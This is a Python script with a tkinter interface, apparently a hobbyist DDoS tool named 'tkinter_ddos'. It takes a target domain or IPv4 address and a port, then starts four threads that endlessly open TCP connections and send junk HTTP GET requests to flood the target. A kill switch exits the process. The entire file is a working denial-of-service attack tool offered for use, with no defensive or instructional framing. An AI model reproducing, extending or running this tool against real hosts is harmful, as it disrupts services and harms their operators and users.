#!/usr/bin/python
import socket
from threading import Thread
from tkinter import * #as tk
from tkinter import messagebox
import os
import time
#host and port input
def form():
    #host = input_host.get()
    global target
    target = socket.gethostbyname(input_host.get())

    try:
        global port
        port = int(port_submit.get())
    except (ValueError):
        messagebox.showinfo("ValueError", "no port given")
    #print(target, port)
#main funtion that does all the magic
def output_box():
    text.insert(tk.END, reply)
    text.see(tk.END)
def ddos():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
            try:
                mysocket.connect((target, port))
                #random scheiß daten
                mysocket.send(str.encode("GET " + "html suckt" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "html suckt" + "HTTP/1.1 \r\n"), (target, port))
                global reply
                reply = mysocket.recv(4096)
                #print(reply)
            except socket.error:
                #time.sleep(2)
                print("Server down time.\n")
                #time.sleep(5)

        mysocket.close()
#thread thing
def start():
    for i in range(4):
        t = Thread(target=ddos)
        t.start()
#kill thing
def kill():
    for i in range(4):
        t = Thread(target=ddos)
        os._exit(1)
#mainloop for the gui
window = Tk()
window.title("tkinter_ddos")
window.minsize(width=600, height=500)
lable = Label(window, text="Target domian/ipv4.")
input_host = Entry(window)
port_lable = Label(window, text="port")
port_submit = Entry(window)
dos_start_button = Button(window, text="start", command=start)
input_button = Button(window, text="submit", command=form)
kill_it = Button(window, text="kill_switch", command=kill)
#output = Button(window, command=output_box())
#text = Text(window, width=80, height=20)
#output.config(state="disabled")
#pack things
#host
lable.pack()
input_host.pack()
#port
port_lable.pack()
port_submit.pack()
#start thing
input_button.pack()
input_host.pack()
dos_start_button.pack()
#run it kill everything
kill_it.pack()
#output.pack()
window.mainloop()

